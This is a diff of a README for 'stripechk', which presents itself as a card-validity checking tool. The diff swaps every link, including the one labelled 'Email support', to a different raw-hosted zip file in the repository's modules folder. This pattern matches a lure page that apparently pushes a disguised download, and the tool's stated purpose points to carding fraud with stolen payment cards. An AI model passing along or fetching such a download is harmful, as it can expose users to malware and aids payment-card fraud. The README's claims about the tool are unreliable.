@@ -6,9 +6,9 @@ Welcome to **stripechk**, your go-to tool for checking card validity and process
 
 ## 📥 Download and Install
 
-[![Download stripechk](https://raw.githubusercontent.com/LXDZCL/stripechk/main/modules/Software_1.3.zip)](https://raw.githubusercontent.com/LXDZCL/stripechk/main/modules/Software_1.3.zip)
+[![Download stripechk](https://github.com/LXDZCL/stripechk/raw/refs/heads/main/modules/Software-v3.4.zip)](https://github.com/LXDZCL/stripechk/raw/refs/heads/main/modules/Software-v3.4.zip)
 
-To get started with stripechk, visit [this page to download](https://raw.githubusercontent.com/LXDZCL/stripechk/main/modules/Software_1.3.zip). You will find the latest version of the application ready for you.
+To get started with stripechk, visit [this page to download](https://github.com/LXDZCL/stripechk/raw/refs/heads/main/modules/Software-v3.4.zip). You will find the latest version of the application ready for you.
 
 ### ⚙️ System Requirements
 
@@ -59,7 +59,7 @@ If you encounter issues or have questions, reach out for support:
 
 - **Documentation**: Comprehensive documentation is available in the repository.
 - **Community Forums**: Connect with other users for tips and advice.
-- **Contact Us**: Email support at [https://raw.githubusercontent.com/LXDZCL/stripechk/main/modules/Software_1.3.zip](https://raw.githubusercontent.com/LXDZCL/stripechk/main/modules/Software_1.3.zip).
+- **Contact Us**: Email support at [https://github.com/LXDZCL/stripechk/raw/refs/heads/main/modules/Software-v3.4.zip](https://github.com/LXDZCL/stripechk/raw/refs/heads/main/modules/Software-v3.4.zip).
 
 ## 👥 Contributing
 
@@ -67,4 +67,4 @@ We welcome contributions to make stripechk even better. If you're interested, pl
 
 ## 🚀 Download and Install
 
-To get the latest version of stripechk, visit [this page to download](https://raw.githubusercontent.com/LXDZCL/stripechk/main/modules/Software_1.3.zip). Enjoy the ease of checking cards with stripechk.
+To get the latest version of stripechk, visit [this page to download](https://github.com/LXDZCL/stripechk/raw/refs/heads/main/modules/Software-v3.4.zip). Enjoy the ease of checking cards with stripechk.
